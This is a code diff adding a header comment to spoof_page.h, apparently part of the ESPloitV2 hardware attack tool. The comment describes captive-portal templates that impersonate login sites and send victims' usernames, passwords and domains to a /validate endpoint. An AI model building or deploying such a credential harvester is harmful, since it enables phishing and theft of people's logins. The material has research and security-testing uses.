@@ -1,3 +1,31 @@
+/*
+ * spoof_page.h - ESPortal credential harvester templates for ESPloitV2
+ *
+ * Defines 5 PROGMEM HTML templates served by the captive-portal web server:
+ *   PORTAL_LOGIN_HTML  - Welcome/landing page shown on captive-portal connect
+ *   SITE_OTHER_HTML    - Catch-all generic login page for unmatched domains
+ *   SITE1_HTML         - Branded spoof login (amber theme)
+ *   SITE2_HTML         - Branded spoof login (cyan theme)
+ *   SITE3_HTML         - Branded spoof login (purple theme)
+ *
+ * Each login template uses self-contained inline CSS (NOT /style.css) so
+ * pages render correctly as standalone captive-portal responses and look
+ * like legitimate sites without external asset dependencies.
+ *
+ * All login forms POST credentials via GET to /validate with fields:
+ *   user  - username / email input
+ *   pass  - password input
+ *   url   - hidden field, auto-filled via JS with document.domain
+ *
+ * Templates can be overridden by uploading custom HTML files via FTP:
+ *   welcome.html, spoof_other.html, spoof_site1.html,
+ *   spoof_site2.html, spoof_site3.html
+ *
+ * Visual themes:
+ *   PORTAL = teal gradient    OTHER = dark
+ *   SITE1  = amber            SITE2 = cyan    SITE3 = purple
+ */
+
 const char PORTAL_LOGIN_HTML[] PROGMEM = R"=====(
 <!DOCTYPE html>
 <html lang="en">
